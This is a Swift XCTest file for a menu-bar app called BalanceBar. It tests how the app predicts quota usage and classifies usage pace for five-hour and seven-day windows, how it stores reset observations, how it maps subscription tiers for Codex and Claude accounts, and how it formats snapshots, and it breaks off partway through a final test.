import Foundation
import XCTest
@testable import BalanceBar

func withLunaReserveUserFacingEnabled(_ body: () throws -> Void) rethrows {
    let previous = LunaReserveUserFacing.testOverride
    LunaReserveUserFacing.testOverride = true
    defer { LunaReserveUserFacing.testOverride = previous }
    try body()
}

final class DomainModelsTests: XCTestCase {
    private func predictionWindow(_ kind: OfficialQuotaWindow.Kind, _ remaining: Double, reset: Date) -> OfficialQuotaWindow {
        OfficialQuotaWindow(kind: kind, remaining: remaining, label: "quota", daysText: "quota", reset: nil,
            durationSeconds: kind == .fiveHour ? 18_000 : 604_800, resetAt: reset)
    }

    private func predictionDefaults() throws -> UserDefaults {
        let name = "BalanceBarTests.prediction-cycles.\(UUID().uuidString)"
        let defaults = try XCTUnwrap(UserDefaults(suiteName: name))
        addTeardownBlock { defaults.removePersistentDomain(forName: name) }
        return defaults
    }

    func testWeeklyPredictionAverageThresholdAndInvalidWindows() throws {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let start = now.addingTimeInterval(-172_800)
        let window = predictionWindow(.sevenDay, 40.4, reset: start.addingTimeInterval(604_800))
        XCTAssertEqual(OfficialQuotaUsagePrediction.inferredCycleStart(for: window), start)
        guard case .runsOut(let seconds) = OfficialQuotaUsagePrediction.make(for: window, cycleStart: start, now: now) else {
            return XCTFail("Expected raw weekly average prediction")
        }
        XCTAssertEqual(seconds, 40.4 / (59.6 / 172_800), accuracy: 0.000001)
        let threshold = 604_800.0 * 0.03
        XCTAssertEqual(threshold, 5 * 3600 + 2 * 60 + 24)
        for (elapsed, remaining, eligible) in [(threshold, 99.0, true), (threshold - 0.01, 99.0, false), (threshold, 99.0001, false)] {
            let quota = predictionWindow(.sevenDay, remaining, reset: now.addingTimeInterval(604_800 - elapsed))
            XCTAssertEqual(OfficialQuotaUsagePrediction.make(for: quota,
                cycleStart: now.addingTimeInterval(-elapsed), now: now) != nil, eligible)
        }
        for remaining in [Double.nan, .infinity, -1, 101] {
            XCTAssertNil(OfficialQuotaUsagePrediction.make(for: predictionWindow(.sevenDay, remaining, reset: window.resetAt!), cycleStart: start, now: now))
        }
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: window, cycleStart: start, now: Date(timeIntervalSince1970: .nan)))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: window, cycleStart: start, now: window.resetAt!))
        let nonstandard = OfficialQuotaWindow(kind: .sevenDay, remaining: 40, label: "7d", daysText: "7d", reset: nil,
            durationSeconds: 604_799, resetAt: start.addingTimeInterval(604_799))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: nonstandard, cycleStart: start, now: now))
    }

    func testPredictionCycleStorePersistsRefillAndSeparatesKindsAccountsAndProviders() throws {
        let defaults = try predictionDefaults()
        let store = CodexResetObservationStore(defaults: defaults)
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let reset = now.addingTimeInterval(9000) // Identical deadlines must not conflate window kinds.
        func windows(_ five: Double, _ seven: Double) -> [OfficialQuotaWindow] {
            [predictionWindow(.fiveHour, five, reset: reset), predictionWindow(.sevenDay, seven, reset: reset)]
        }
        func update(_ store: CodexResetObservationStore, _ values: [OfficialQuotaWindow], at: Date = now,
                    account: String = "a", provider: String = "official") -> [QuotaPredictionContext] {
            store.updatePredictionContexts(providerID: provider, accountKey: account, windows: values, now: at)
        }
        XCTAssertEqual(update(store, windows(40, 40)).compactMap(\.inferredCycleStart).count, 2)
        XCTAssertTrue(update(store, windows(40, 40), account: "").isEmpty)
        XCTAssertTrue(update(store, windows(40, 40), at: Date(timeIntervalSince1970: .nan)).isEmpty)
        _ = update(store, windows(40, 40), account: "tiny-refill")
        XCTAssertNil(update(store, windows(40.00001, 40), account: "tiny-refill").first { $0.cycle.kind == .fiveHour }?.inferredCycleStart)
        let refilled = update(store, windows(60, 35))
        XCTAssertNil(refilled.first { $0.cycle.kind == .fiveHour }?.inferredCycleStart)
        XCTAssertNotNil(refilled.first { $0.cycle.kind == .sevenDay }?.inferredCycleStart)
        let restarted = CodexResetObservationStore(defaults: defaults)
        XCTAssertTrue(update(restarted, []).isEmpty)
        XCTAssertTrue(update(restarted, [predictionWindow(.sevenDay, .nan, reset: reset)]).isEmpty)
        XCTAssertNotNil(update(restarted, [predictionWindow(.sevenDay, 30, reset: reset)]).first?.inferredCycleStart)
        XCTAssertNil(update(restarted, [predictionWindow(.fiveHour, 55, reset: reset)]).first?.inferredCycleStart)
        XCTAssertEqual(update(restarted, windows(55, 30), account: "b").compactMap(\.inferredCycleStart).count, 2)
        XCTAssertEqual(update(restarted, windows(55, 30), provider: "other").compactMap(\.inferredCycleStart).count, 2)
        let next = predictionWindow(.fiveHour, 50, reset: reset.addingTimeInterval(1000))
        XCTAssertNotNil(update(restarted, [next]).first?.inferredCycleStart)
        XCTAssertTrue(update(restarted, [predictionWindow(.fiveHour, 40, reset: reset)]).isEmpty, "Old deadline cannot replace a newer cycle")
        XCTAssertTrue(update(restarted, [next], at: now.addingTimeInterval(-1)).isEmpty)
        XCTAssertTrue(update(restarted, [next, next]).isEmpty, "Ambiguous duplicate windows cannot qualify")
    }

    func testPredictionStoreConsumesQuotaResetEventOnceWithoutChangingEventPayload() throws {
        let defaults = try predictionDefaults()
        let store = CodexResetObservationStore(defaults: defaults)
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let fiveReset = now.addingTimeInterval(9000)
        let oldWeekReset = now.addingTimeInterval(300_000)
        let newWeekReset = now.addingTimeInterval(604_800)
        var observation = CodexResetObservation()
        observation.observe(CodexResetQuotaSample(fiveHourRemaining: 100, sevenDayRemaining: 40, sevenDayResetAt: oldWeekReset), now: now)
        store.saveQuotaEvidence(providerID: "official", accountKey: "a", evidence: observation)
        let watching = store.updatePredictionContexts(providerID: "official", accountKey: "a", windows: [
            predictionWindow(.fiveHour, 100, reset: fiveReset), predictionWindow(.sevenDay, 40, reset: oldWeekReset)], now: now)
        XCTAssertEqual(watching.compactMap(\.inferredCycleStart).count, 2, "Watching is not a confirmed reset")
        observation.observeLatestQuotaEvent(CodexResetQuotaSample(fiveHourRemaining: 100, sevenDayRemaining: 100,
            sevenDayResetAt: newWeekReset), now: now.addingTimeInterval(1))
        XCTAssertEqual(observation.state, .observed)
        store.saveQuotaEvidence(providerID: "official", accountKey: "a", evidence: observation)
        store.save(providerID: "official", accountKey: "a", episodeKey: "episode", observation: observation)
        let resetPayloads = defaults.dictionaryRepresentation().filter { $0.key.hasPrefix("BalanceBar.codexResetObservation.") }
        let first = store.updatePredictionContexts(providerID: "official", accountKey: "a", windows: [
            predictionWindow(.sevenDay, 100, reset: newWeekReset)], now: now.addingTimeInterval(1))
        let sameFive = store.updatePredictionContexts(providerID: "official", accountKey: "a", windows: [
            predictionWindow(.fiveHour, 100, reset: fiveReset)], now: now.addingTimeInterval(2))
        XCTAssertNil(sameFive.first?.inferredCycleStart, "The event invalidates old five-hour basis even when that window was missing")
        XCTAssertEqual(first.first { $0.cycle.kind == .sevenDay }?.inferredCycleStart, now, "Start comes from metadata, not detectedAt")
        let restarted = CodexResetObservationStore(defaults: defaults)
        let next = restarted.updatePredictionContexts(providerID: "official", accountKey: "a", windows: [
            predictionWindow(.sevenDay, 90, reset: newWeekReset)], now: now.addingTimeInterval(18_144))
        let context = try XCTUnwrap(next.first)
        XCTAssertEqual(context.inferredCycleStart, now, "Repeated observed event must not clear the new cycle")
        XCTAssertNotNil(OfficialQuotaUsagePrediction.make(for: predictionWindow(.sevenDay, 90, reset: newWeekReset),
            cycleStart: context.inferredCycleStart, now: now.addingTimeInterval(18_144)))
        let refilledWeek = restarted.updatePredictionContexts(providerID: "official", accountKey: "a", windows: [
            predictionWindow(.sevenDay, 95, reset: newWeekReset)], now: now.addingTimeInterval(19_000))
        XCTAssertNil(refilledWeek.first?.inferredCycleStart)
        XCTAssertNil(restarted.updatePredictionContexts(providerID: "official", accountKey: "a", windows: [
            predictionWindow(.sevenDay, 94, reset: newWeekReset)], now: now.addingTimeInterval(19_001)).first?.inferredCycleStart,
            "An already processed reset event cannot release a later same-cycle refill suppression")
        for (key, value) in resetPayloads where !key.hasSuffix(".predictionCycles") {
            XCTAssertEqual(defaults.data(forKey: key), value as? Data, "Existing event encoding must remain untouched")
        }
        XCTAssertEqual(store.load(providerID: "official", accountKey: "a")?.episodeKey, "episode")
        // A genuinely newer five-hour deadline replaces the invalid old basis.
        let recoveredFive = predictionWindow(.fiveHour, 40, reset: now.addingTimeInterval(27_144))
        XCTAssertNotNil(restarted.updatePredictionContexts(providerID: "official", accountKey: "a",
            windows: [recoveredFive], now: now.addingTimeInterval(19_001)).first?.inferredCycleStart)
    }

    func testPredictionContextSurvivesCompactAndReserveSnapshotDerivation() throws {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let quota = predictionWindow(.fiveHour, 0, reset: now.addingTimeInterval(9000))
        let context = QuotaPredictionContext(cycle: try XCTUnwrap(QuotaPredictionCycle(window: quota)), inferredCycleStart: now.addingTimeInterval(-9000))
        let snapshot = Snapshot.official("Official", 0, "5h", nil, now, windows: [quota],
            lunaReserve: LunaReserveQuota(status: .available, remaining: 30, reset: nil),
            quotaPredictionContexts: [context], quotaPredictionAccountKey: "a")
        for reserve in [false, true] {
            withLunaReserveUserFacingEnabled {
                let derived = snapshot.menuBarSnapshot(preferredQuotaWindow: .fiveHour, automaticallyUseLunaReserve: reserve)
                XCTAssertEqual(derived.quotaPredictionContexts, [context])
                XCTAssertEqual(derived.quotaPredictionAccountKey, "a")
            }
        }
    }

    func testQuotaPredictionUsesWholeCycleAverageAndUnroundedValues() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let start = now.addingTimeInterval(-6_840)
        func window(_ remaining: Double) -> OfficialQuotaWindow {
            OfficialQuotaWindow(kind: .fiveHour, remaining: remaining, label: "5h", daysText: "5h",
                reset: nil, durationSeconds: 18_000, resetAt: now.addingTimeInterval(11_160))
        }
        for (remaining, seconds) in [(50.0, 6_840.0), (60.0, 10_260.0)] {
            let quota = window(remaining)
            guard case .runsOut(let actual) = OfficialQuotaUsagePrediction.make(for: quota, cycleStart: start, now: now) else {
                return XCTFail("Expected exhaustion before reset")
            }
            XCTAssertEqual(actual, seconds, accuracy: 0.000001)
        }
        XCTAssertEqual(OfficialQuotaUsagePace.make(for: window(60), now: now)?.status, .normal)
        XCTAssertEqual(OfficialQuotaUsagePrediction.make(for: window(62), cycleStart: start, now: now), .lastsUntilReset)
        XCTAssertEqual(OfficialQuotaUsagePrediction.make(for: window(80), cycleStart: start, now: now), .lastsUntilReset)
        guard case .runsOut(let fractional) = OfficialQuotaUsagePrediction.make(for: window(54.4), cycleStart: start, now: now) else {
            return XCTFail("Expected a raw-value estimate")
        }
        XCTAssertEqual(fractional, 54.4 / (45.6 / 6_840), accuracy: 0.000001)
    }

    func testQuotaPredictionRequiresEligibleInferredStartAndObservationThresholds() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        func quota(remaining: Double = 99, elapsed: Double = 540, kind: OfficialQuotaWindow.Kind = .fiveHour,
                   duration: Double? = 18_000) -> OfficialQuotaWindow {
            OfficialQuotaWindow(kind: kind, remaining: remaining, label: "quota", daysText: "quota", reset: nil,
                durationSeconds: duration, resetAt: now.addingTimeInterval((duration ?? 18_000) - elapsed))
        }
        let start = now.addingTimeInterval(-540)
        XCTAssertNotNil(OfficialQuotaUsagePrediction.make(for: quota(), cycleStart: start, now: now))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: quota(elapsed: 539.99),
            cycleStart: now.addingTimeInterval(-539.99), now: now))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: quota(remaining: 99.0001), cycleStart: start, now: now))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: quota(remaining: 100), cycleStart: start, now: now))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: quota(), cycleStart: nil, now: now))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: quota(), cycleStart: now, now: now))
        XCTAssertNil(OfficialQuotaUsagePrediction.make(for: quota(), cycleStart: Date(timeIntervalSince1970: .nan), now: now))
        XCTAssertNotNil(OfficialQuotaUsagePrediction.inferredCycleStart(for: quota(kind: .sevenDay, duration: 604_800)))
        XCTAssertNil(OfficialQuotaUsagePrediction.inferredCycleStart(for: quota(kind: .other)))
        XCTAssertNil(OfficialQuotaUsagePrediction.inferredCycleStart(for: quota(duration: 17_999.5)))
        XCTAssertEqual(OfficialQuotaUsagePrediction.inferredCycleStart(for: quota()), start)
        for window in [quota(remaining: .nan), quota(remaining: .infinity), quota(remaining: -1),
                       quota(remaining: 101), quota(kind: .other), quota(duration: nil),
                       quota(duration: 0), quota(elapsed: 18_000)] {
            XCTAssertNil(OfficialQuotaUsagePrediction.make(for: window, cycleStart: start, now: now))
        }
        XCTAssertEqual(OfficialQuotaUsagePrediction.make(for: quota(remaining: 0), cycleStart: start, now: now), .runsOut(after: 0))
    }

    func testQuotaPredictionComparesRawSecondsAtResetBoundary() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let start = now.addingTimeInterval(-9_000)
        for remaining in [50.0, 50.00000001] {
            let window = OfficialQuotaWindow(kind: .fiveHour, remaining: remaining, label: "5h", daysText: "5h",
                reset: nil, durationSeconds: 18_000, resetAt: now.addingTimeInterval(9_000))
            XCTAssertEqual(OfficialQuotaUsagePrediction.make(for: window, cycleStart: start, now: now), .lastsUntilReset)
        }
        let window = OfficialQuotaWindow(kind: .fiveHour, remaining: 49.99999999, label: "5h", daysText: "5h",
            reset: nil, durationSeconds: 18_000, resetAt: now.addingTimeInterval(9_000))
        guard case .runsOut(let seconds) = OfficialQuotaUsagePrediction.make(for: window, cycleStart: start, now: now) else {
            return XCTFail("Even a normally titled estimate strictly before reset should show a time")
        }
        XCTAssertLessThan(seconds, 9_000)
        XCTAssertEqual(OfficialQuotaUsagePace.make(for: window, now: now)?.status, .normal)
    }

    func testPaceClassificationUsesIndividuallyRoundedDisplayValues() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        for (actual, expected, difference, status) in [
            (54.4, 59.6, -6, OfficialQuotaUsagePace.Status.fast),
            (59.6, 54.4, 6, .slow),
            (54.5, 59.6, -5, .normal),
            (59.6, 54.5, 5, .normal),
            (44.5, 50, -5, .normal),
            (0, 0.1, 0, .normal),
            (99, 50, 49, .slow),
            (99.99995, 50, 50, .unused)
        ] {
            let window = OfficialQuotaWindow(kind: .fiveHour, remaining: actual,
                label: "5h", daysText: "5h", reset: nil, durationSeconds: 18_000,
                resetAt: now.addingTimeInterval(expected / 100 * 18_000))
            let pace = try XCTUnwrap(OfficialQuotaUsagePace.make(for: window, now: now))
            XCTAssertEqual(pace.roundedDifference, difference)
            XCTAssertEqual(pace.roundedActual - pace.roundedExpected, difference)
            XCTAssertEqual(pace.status, status)
            XCTAssertEqual(pace.expectedRemaining, expected, accuracy: 0.0001)
        }
    }

    func testOfficialQuotaUsagePaceUsesWindowSpecificDurationAndReset() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 50,
            label: "5h",
            daysText: "5h",
            reset: "3h06m",
            durationSeconds: 18_000,
            resetAt: now.addingTimeInterval(11_160)
        )
        let pace = try XCTUnwrap(OfficialQuotaUsagePace.make(for: fiveHour, now: now))
        XCTAssertEqual(pace.expectedRemaining, 62, accuracy: 0.0001)
        XCTAssertEqual(pace.difference, -12, accuracy: 0.0001)
        XCTAssertEqual(pace.status, .fast)

        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 80,
            label: "7d",
            daysText: "7d",
            reset: "5d",
            durationSeconds: 7 * 86_400,
            resetAt: now.addingTimeInterval(5 * 86_400)
        )
        let weeklyPace = try XCTUnwrap(OfficialQuotaUsagePace.make(for: sevenDay, now: now))
        XCTAssertEqual(weeklyPace.expectedRemaining, 100 * 5.0 / 7.0, accuracy: 0.0001)
        XCTAssertEqual(weeklyPace.status, .slow)
    }

    func testIdleWindowProjectsRollingResetFromNow() throws {
        func idle(_ remaining: Double, resetAt: Date? = nil) -> OfficialQuotaWindow {
            OfficialQuotaWindow(kind: .fiveHour, remaining: remaining, label: "5h", daysText: "5h",
                reset: "5h0m", durationSeconds: 18_000, resetAt: resetAt)
        }
        let t1 = Date(timeIntervalSince1970: 1_800_000_000)
        let first = idle(100).projectingIdleReset(now: t1)
        XCTAssertEqual(first.resetAt, t1.addingTimeInterval(18_000))
        XCTAssertEqual(OfficialQuotaUsagePace.make(for: first, now: t1)?.status, .unused)
        let t2 = t1.addingTimeInterval(300)
        XCTAssertEqual(idle(100).projectingIdleReset(now: t2).resetAt, t2.addingTimeInterval(18_000), "the reset rolls with now")

        XCTAssertNil(idle(99).projectingIdleReset(now: t1).resetAt, "a used window without a server reset stays unknown")
        let server = t1.addingTimeInterval(600)
        XCTAssertEqual(idle(100, resetAt: server).projectingIdleReset(now: t1).resetAt, server, "a server reset is never overridden")
    }


    func testOfficialQuotaUsagePaceClassifiesUnusedAndRoundedBoundaries() throws {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        func window(remaining: Double) -> OfficialQuotaWindow {
            OfficialQuotaWindow(
                kind: .fiveHour,
                remaining: remaining,
                label: "5h",
                daysText: "5h",
                reset: "",
                durationSeconds: 18_000,
                resetAt: now.addingTimeInterval(9_000)
            )
        }
        let unused = try XCTUnwrap(OfficialQuotaUsagePace.make(for: window(remaining: 100), now: now))
        XCTAssertEqual(unused.status, .unused)

        let exactFive = try XCTUnwrap(OfficialQuotaUsagePace.make(for: window(remaining: 45), now: now))
        XCTAssertEqual(exactFive.difference, -5, accuracy: 0.0001)
        XCTAssertEqual(exactFive.status, .normal)

        let roundedSix = try XCTUnwrap(OfficialQuotaUsagePace.make(for: window(remaining: 44.4), now: now))
        XCTAssertEqual(roundedSix.roundedDifference, -6)
        XCTAssertEqual(roundedSix.status, .fast)
    }

    func testOfficialQuotaUsagePaceHidesIncompleteOrExpiredWindows() {
        let now = Date(timeIntervalSince1970: 1_700_000_000)
        let base = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 60,
            label: "5h",
            daysText: "5h",
            reset: "",
            durationSeconds: 18_000,
            resetAt: now.addingTimeInterval(9_000)
        )
        XCTAssertNotNil(OfficialQuotaUsagePace.make(for: base, now: now))
        XCTAssertNil(OfficialQuotaUsagePace.make(for: base, now: now.addingTimeInterval(9_000)))
        XCTAssertNil(OfficialQuotaUsagePace.make(for: base, now: now.addingTimeInterval(-18_001)))
        XCTAssertNil(OfficialQuotaUsagePace.make(for: OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 60,
            label: "5h",
            daysText: "5h",
            reset: "",
            durationSeconds: nil,
            resetAt: base.resetAt
        ), now: now))
        XCTAssertNil(OfficialQuotaUsagePace.make(for: OfficialQuotaWindow(
            kind: .other,
            remaining: 60,
            label: "other",
            daysText: "other",
            reset: "",
            durationSeconds: 18_000,
            resetAt: base.resetAt
        ), now: now))
    }

    func testAssistantClientAndStatusLinkValueModels() throws {
        XCTAssertEqual(AssistantClient.codex.appType, "codex")
        XCTAssertEqual(AssistantClient.codex.displayName, "Codex")
        XCTAssertEqual(AssistantClient.claude.appType, "claude")
        XCTAssertEqual(AssistantClient.claude.displayName, "Claude Code")
        XCTAssertEqual(AssistantClient.grok.appType, "grokbuild")
        XCTAssertEqual(AssistantClient.grok.displayName, "Grok")
        XCTAssertTrue(AssistantClient.codex.usesRotationAnimation)
        XCTAssertFalse(AssistantClient.grok.usesRotationAnimation)
        XCTAssertFalse(AssistantClient.claude.usesRotationAnimation)

        let link = StatusLink(title: "Status", url: "https://status.example")
        XCTAssertEqual(link, StatusLink(title: "Status", url: "https://status.example"))
        let encoded = try JSONEncoder().encode(link)
        XCTAssertEqual(try JSONDecoder().decode(StatusLink.self, from: encoded), link)
    }

    func testOfficialAccountPresentationUsesOnlyCurrentOfficialCodexOrClaudeProvider() {
        let available = OpenAIAccountPresentation.current(
            activeClient: .codex,
            providerIsOfficial: true,
            email: "person@example.com",
            subscription: .proFiveX
        )
        XCTAssertEqual(available?.state, .available("person@example.com"))
        XCTAssertEqual(available?.subscription, .proFiveX)
        XCTAssertEqual(available?.text(language: .simplifiedChinese), "person@example.com")
        XCTAssertEqual(available?.text(language: .traditionalChineseTaiwan), "person@example.com")
        XCTAssertEqual(available?.text(language: .japanese), "person@example.com")
        XCTAssertEqual(available?.text(language: .english), "person@example.com")

        let unavailable = OpenAIAccountPresentation.current(
            activeClient: .codex,
            providerIsOfficial: true,
            email: nil
        )
        XCTAssertEqual(unavailable?.state, .unavailable)
        XCTAssertEqual(unavailable?.text(language: .simplifiedChinese), "账户不可用")
        XCTAssertEqual(unavailable?.text(language: .traditionalChineseTaiwan), "帳號不可用")
        XCTAssertEqual(unavailable?.text(language: .japanese), "アカウントを利用できません")
        XCTAssertEqual(unavailable?.text(language: .english), "Account unavailable")

        let claude = OpenAIAccountPresentation.current(
            activeClient: .claude,
            providerIsOfficial: true,
            email: "claude@example.com",
            subscription: OpenAISubscriptionTier(planType: "max_5x", client: .claude)
        )
        XCTAssertEqual(claude?.state, .available("claude@example.com"))
        XCTAssertEqual(claude?.subscription?.text, "Max · 5x")
        XCTAssertNil(
            OpenAIAccountPresentation.current(
                activeClient: .grok,
                providerIsOfficial: true,
                email: "should-not-leak@example.com"
            )
        )
        XCTAssertNil(
            OpenAIAccountPresentation.current(
                activeClient: .claude,
                providerIsOfficial: false,
                email: "should-not-leak@example.com"
            )
        )
        XCTAssertNil(
            OpenAIAccountPresentation.current(
                activeClient: .codex,
                providerIsOfficial: false,
                email: "should-not-leak@example.com"
            )
        )
    }

    func testOpenAISubscriptionTierMapsOfficialPlanClaimsToTheRequestedBadgeText() {
        XCTAssertEqual(OpenAISubscriptionTier(planType: "plus"), .plus)
        XCTAssertEqual(OpenAISubscriptionTier(planType: "prolite"), .proFiveX)
        XCTAssertEqual(OpenAISubscriptionTier(planType: "PRO"), .proTwentyX)
        XCTAssertEqual(OpenAISubscriptionTier(planType: " pro_20x "), .proTwentyX)
        XCTAssertNil(OpenAISubscriptionTier(planType: "team"))
        XCTAssertNil(OpenAISubscriptionTier(planType: nil))

        XCTAssertEqual(OpenAISubscriptionTier.plus.text, "PLUS")
        XCTAssertEqual(OpenAISubscriptionTier.proFiveX.text, "Pro · 5x")
        XCTAssertEqual(OpenAISubscriptionTier.proTwentyX.text, "Pro · 20x")
    }

    func testClaudeSubscriptionTierDoesNotReuseCodexProMapping() {
        XCTAssertEqual(OpenAISubscriptionTier(planType: "pro", client: .claude)?.text, "Pro")
        XCTAssertEqual(OpenAISubscriptionTier(planType: "pro", client: .codex)?.text, "Pro · 20x")
        XCTAssertEqual(OpenAISubscriptionTier(planType: "max", client: .claude)?.text, "Max")
        XCTAssertEqual(OpenAISubscriptionTier(planType: "max_5x", client: .claude)?.text, "Max · 5x")
        XCTAssertEqual(OpenAISubscriptionTier(planType: " MAX_20X ", client: .claude)?.text, "Max · 20x")
        XCTAssertEqual(OpenAISubscriptionTier(planType: "team", client: .claude)?.text, "Team")
        XCTAssertEqual(OpenAISubscriptionTier(planType: "enterprise", client: .claude)?.text, "Enterprise")
        XCTAssertNil(OpenAISubscriptionTier(planType: "free", client: .claude))
        XCTAssertNil(OpenAISubscriptionTier(planType: nil, client: .claude))
        XCTAssertNil(OpenAISubscriptionTier(planType: "plus", client: .claude))
        XCTAssertNil(OpenAISubscriptionTier(planType: "pro", client: .grok))
    }

    func testPlaceholderAndOfficialSnapshotFormatting() {
        let placeholder = Snapshot.placeholder
        XCTAssertEqual(placeholder.kind, .placeholder)
        XCTAssertEqual(placeholder.menuBarTitle, " …")
        XCTAssertEqual(placeholder.menuBarPrimary, "…")
        XCTAssertEqual(placeholder.menuBarSecondary, "")
        XCTAssertEqual(placeholder.overviewProvider, "CC Switch")
        XCTAssertEqual(placeholder.overviewQuotaTitle, tr(.keySnapshotBalanceStatus))
        XCTAssertEqual(placeholder.overviewQuotaDetail, tr(.keySnapshotWaitingToRefresh))
        XCTAssertEqual(placeholder.overviewLargeAmount, "—")
        XCTAssertNil(placeholder.progressPercentage)
        XCTAssertEqual(placeholder.title, tr(.keySnapshotLoadingCcSwitch))
        XCTAssertEqual(placeholder.compactQuotaTitle, tr(.keySnapshotLoadingCcSwitch))
        XCTAssertEqual(placeholder.compactResetTitle, "")
        XCTAssertEqual(placeholder.detail, tr(.keySnapshotWaitingForCcSwitchStatus))

        let official = Snapshot.official(
            "OpenAI",
            87.6,
            "7-Day Quota",
            "2 hours",
            Date(timeIntervalSince1970: 1_700_000_000)
        )
        XCTAssertEqual(official.menuBarTitle, " 87%")
        XCTAssertEqual(official.menuBarPrimary, "87%")
        XCTAssertEqual(official.menuBarSecondary, "2 hours")
        let officialTitle = tr(
            .keySnapshotValueRemainingValueValue,
            arguments: ["OpenAI", "87", "7-Day Quota"]
        )
        XCTAssertEqual(
            official.menuBarToolTip,
            tr(.keySnapshotValueResetValue, arguments: [officialTitle, "2 hours"])
        )
        XCTAssertEqual(official.overviewProvider, "OpenAI")
        XCTAssertEqual(
            official.overviewReset(refreshDate: nil, formatter: DateFormatter()),
            tr(.keySnapshotResetValue, arguments: ["2 hours"])
        )
        XCTAssertEqual(official.overviewQuotaTitle, tr(.keySnapshotAvailableQuota))
        XCTAssertEqual(official.overviewQuotaDetail, "7-Day Quota")
        XCTAssertEqual(official.overviewLargeAmount, "87%")
        XCTAssertEqual(official.progressPercentage, 87.6)
        XCTAssertEqual(
            official.compactQuotaTitle,
            tr(.keySnapshotValueRemainingValue2, arguments: ["7-Day Quota", "87"])
        )
        XCTAssertEqual(
            official.compactResetTitle,
            tr(.keySnapshotResetValue2, arguments: ["2 hours"])
        )
        XCTAssertEqual(
            official.detail,
            tr(
                .keySnapshotOfficialQuotaUpdatesEveryMinutevalue,
                arguments: [tr(.keySnapshotResetValue3, arguments: ["2 hours"])]
            )
        )
    }

    func testOfficialSnapshotKeepsBothCodexWindowsAndUsesWeeklyValuesForLegacyConsumers() {
        let windows = [
            OfficialQuotaWindow(
                kind: .fiveHour,
                remaining: 80,
                label: tr(.keyResponseParsers5HourQuota),
                daysText: tr(.keyResponseParsers5Hours),
                reset: "1h0m",
                durationSeconds: 18_000
            ),
            OfficialQuotaWindow(
                kind: .sevenDay,
                remaining: 45,
                label: tr(.keyResponseParsers7DayQuota2),
                daysText: tr(.keyResponseParsers7Days4),
                reset: "1h30m",
                durationSeconds: 604_800
            )
        ]
        let snapshot = Snapshot.official(
            "OpenAI",
            45,
            tr(.keyResponseParsers7DayQuota2),
            "1h30m",
            Date(timeIntervalSince1970: 1_700_000_000),
            windows: Array(windows.reversed())
        )

        XCTAssertEqual(snapshot.officialQuotaWindowsForMenu.map(\.kind), [.fiveHour, .sevenDay])
        XCTAssertEqual(snapshot.amount, 45)
        XCTAssertEqual(snapshot.unit, tr(.keyResponseParsers7DayQuota2))
        XCTAssertEqual(snapshot.message, "1h30m")
        XCTAssertEqual(snapshot.menuBarPrimary, "45%")
        XCTAssertEqual(snapshot.menuBarSecondary, "1h30m")

        let legacySnapshot = Snapshot.official(
            "OpenAI",
            80,
            tr(.keyResponseParsersQuota),
            "later",
            Date(timeIntervalSince1970: 1_700_000_000),
            windows: [
                OfficialQuotaWindow(
                    kind: .other,
                    remaining: 80,
                    label: tr(.keyResponseParsersQuota),
                    daysText: tr(.keyResponseParsersQuota2),
                    reset: "later",
                    durationSeconds: nil
                ),
                OfficialQuotaWindow(
                    kind: .other,
                    remaining: 60,
                    label: tr(.keyResponseParsersQuota),
                    daysText: tr(.keyResponseParsersQuota2),
                    reset: "later too",
                    durationSeconds: nil
                )
            ]
        )
        XCTAssertEqual(legacySnapshot.officialQuotaWindowsForMenu.count, 1)
    }

    func testOfficialSnapshotCarriesLunaReserveThroughCompactPresentation() {
        LunaReserveUserFacing.testOverride = true
        defer { LunaReserveUserFacing.testOverride = nil }
        let reserve = LunaReserveQuota(
            status: .available,
            remaining: 45,
            reset: "1h30m"
        )
        let snapshot = Snapshot.official(
            "OpenAI",
            45,
            tr(.keyResponseParsers7DayQuota2),
            "1h30m",
            Date(timeIntervalSince1970: 1_700_000_000),
            lunaReserve: reserve
        )

        XCTAssertEqual(snapshot.lunaReserve, reserve)
        XCTAssertEqual(
            snapshot.menuBarSnapshot(preferredQuotaWindow: .fiveHour).lunaReserve,
            reserve
        )
        XCTAssertTrue(snapshot.menuBarToolTip.contains(tr(.keyLunaReserveTitle)))
        XCTAssertTrue(snapshot.menuBarToolTip.contains(reserve.status.localizedText))
        XCTAssertTrue(snapshot.menuBarToolTip.contains(reserve.remainingText))
    }

    func testOfficialQuotaMenuPresentationShowsBankedResetOnlyWhenCardsExist() throws {
        let date = Date(timeIntervalSince1970: 1_700_000_000)
        let fiveHour = OfficialQuotaWindow(
            kind: .fiveHour,
            remaining: 80,
            label: "5-hour",
            daysText: "5 hours",
            reset: "1h",
            durationSeconds: 18_000
        )
        let sevenDay = OfficialQuotaWindow(
            kind: .sevenDay,
            remaining: 45,
            label: "7-day",
            daysText: "7 days",
            reset: "6d",
            durationSeconds: 604_800
        )
        let earlier = CodexBankedResetCard(
            id: "earlier",
            resetType: "codex_rate_limits",
            titleText: tr(.keyCodexBankedResetFullResetTitle),
            expiresAt: date.addingTimeInterval(3_600),
            expiresText: "Expires later"
        )
        let undated = CodexBankedResetCard(
            id: "undated",
            resetType: "codex_rate_limits",
            titleText: tr(.keyCodexBankedResetFullResetTitle),
            expiresAt: nil,
            expiresText: nil
        )
        let bankedReset = CodexBankedReset(cards: [earlier, undated])

        let official = Snapshot.official(
            "OpenAI",
            45,
            sevenDay.label,
            sevenDay.reset,
            date,
